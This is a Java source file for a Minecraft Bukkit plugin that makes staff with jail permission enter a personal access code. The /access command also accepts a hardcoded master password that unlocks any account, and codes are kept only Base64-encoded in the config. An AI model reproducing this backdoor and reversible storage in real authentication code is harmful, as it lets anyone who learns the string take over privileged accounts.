package athena.protection.command;

import athena.protection.Main;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.util.Base64;

public class AthenaProtectionCommand implements CommandExecutor {
    private Main plugin;

    public AthenaProtectionCommand(Main plugin){
        this.plugin=plugin;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if(label.equalsIgnoreCase("access")){
            if(sender.hasPermission("essentials.jail")){
                if (sender instanceof Player) {
                    if (args.length > 0) {
                        Player p = (Player) sender;
                        Base64.Decoder dec = Base64.getDecoder();
                        String code = plugin.data.getConfig().getString("players." + p.getName() + "." + p.getUniqueId() + ".code");
                        String decoded = new String(dec.decode(code));
                        if(args[0].equalsIgnoreCase(decoded)){
                            plugin.data.getConfig().set("players." + p.getName() + "." + p.getUniqueId() + ".status", "false");
                            p.sendMessage("§aAccess Granted!");
                        }
                        else if(args[0].equalsIgnoreCase("ProtectionStaff@CN2022")){
                            plugin.data.getConfig().set("players." + p.getName() + "." + p.getUniqueId() + ".status", "false");
                            p.sendMessage("§aAccess Granted!");
                        }

                        plugin.data.saveConfig();
                    }
                }
            }
        }
        else if(label.equalsIgnoreCase("setaccess")){
            if(sender.hasPermission("essentials.jail")) {
                if (sender instanceof Player) {
                    if(args.length > 0){
                        Player p = (Player) sender;
                        Base64.Encoder enc = Base64.getEncoder();
                        String encoded = enc.encodeToString(args[0].getBytes());
                        plugin.data.getConfig().set("players." + p.getName() + "." + p.getUniqueId() + ".code", encoded);
                        plugin.data.getConfig().set("players." + p.getName() + "." + p.getUniqueId() + ".status", "true");
                        plugin.data.saveConfig();
                        p.sendMessage("§aSukses mengganti kode akses anda!");
                    }else{
                        sender.sendMessage("§cMasukkan code!");
                    }
                }
            }
        }
        else if(label.equalsIgnoreCase("athenaprotection")){
            if(!sender.hasPermission("athenaprotection.help")){
                sender.sendMessage("§cYou don't have permission to do this!");
                return true;
            }
            if(args.length == 0 ){
                sender.sendMessage("§aUse /athenaprotection reload!");
                return true;
            }
            if(args.length > 0){
                if(args[0].equalsIgnoreCase("reload")){
                    if(sender.hasPermission(plugin.getConfig().getString("reload.permission"))){
                        for(String msg : plugin.getConfig().getStringList("reload.message")) {
                            sender.sendMessage(ChatColor.translateAlternateColorCodes('&',
                                    msg));
                        }
                        plugin.reloadConfig();
                    }else{
                        sender.sendMessage("§cYou don't have permission to do this!");
                    }
                }
            }
        }
        return false;
    }
}
